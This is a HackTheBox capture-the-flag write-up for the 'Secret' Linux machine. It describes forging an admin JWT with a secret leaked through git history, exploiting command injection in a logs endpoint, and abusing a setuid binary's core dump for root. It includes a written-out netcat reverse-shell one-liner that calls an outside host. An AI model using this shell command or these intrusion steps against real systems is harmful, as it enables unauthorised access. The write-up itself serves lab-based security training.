# Secret HackTheBox Writeup
### Level: `Easy` | OS: `Linux`
![logo](1.png)

## Scanning
We run nmap on all ports with scripts and software versions.
![](2.png)

## Enumeration
We find the API documentation, we have to authenticate using a *JWT*.
![](3.png)

If we try to access without a token, we see that we do not have access to the resource.
![](4.png)

If we check the site, there is a link that allows us to download the code.

To get to the point, the file "*private.js*" shows the role and username of the administrator user of the application.

![](5.png)

Using the authentication example from the documentation above, we see that the user "*theadmin*" is registered with the e-mail address "*root@dasith.works*":

![](6.png)

We register a user.

![](7.png)

We decode the *JWT* and see the data it contains.

![](8.png)

We access the previous resource, but we still cannot access it because we are a user with a low privilege role.

![](9.png)

We continue with the enumeration, we identify a "*.git*" and we see that they have made some modification in the "*.env*" file.

![](10.png)

We retrieve the file and read its contents, we find the "*token_secret*". This token would allow us to modify our JWT and be able to make arbitrary modifications on it.

![](11.png)

We add the attribute *"role": "admin"* and change our user to "*theadmin*" in our cookie and authenticate, we check that now it works and we have access as the user "*theadmin*".

![](12.png)


## Exploitation
Reviewing the sections of the site, we see that the resource "*logs?file=*" is vulnerable to **Command Injection**:

![](13.png)

We can exploit this vulnerability to read the "*user.txt*" file.

![](14.png)

We use the following payload to gain access (remember to encode it in URL), put a **netcat** listening and send the request from **Burp**.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
![](15.png)

We list an uncommon setuid binary named "*/opt/count*". 

We see that the resource has the permissions of the root user.

![](16.png)

We launch **dirsearch**, we will list the file "*installer/subiquity-server-debug.log*", it contains the hashed credentials of the users used in the application.

![](17.png)

We tried to crack the hash of the user "*dasith*", but failed. So we will put our public key in the user's "*authorized_keys*" file and authenticate with our private key through the **SSH** service.

![](18.png)


## Privilege Escalation
Now we execute this statement to cause the crashes and to store in the report log the root flag.

![](19.png)

We check the "*CoreDump*" file and see that the root flag is in it.

![](20.png)

---
## About

David Utón is Penetration Tester and security auditor for web and mobiles applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks.

#### Contacted on:

<img src='https://m3n0sd0n4ld.github.io/imgs/linkedin.png' width='40' align='center'> [David-Uton](https://www.linkedin.com/in/david-uton/)
<img src='https://m3n0sd0n4ld.github.io/imgs/twitter.png' width='43' align='center'> [@David_Uton](https://twitter.com/David_Uton)
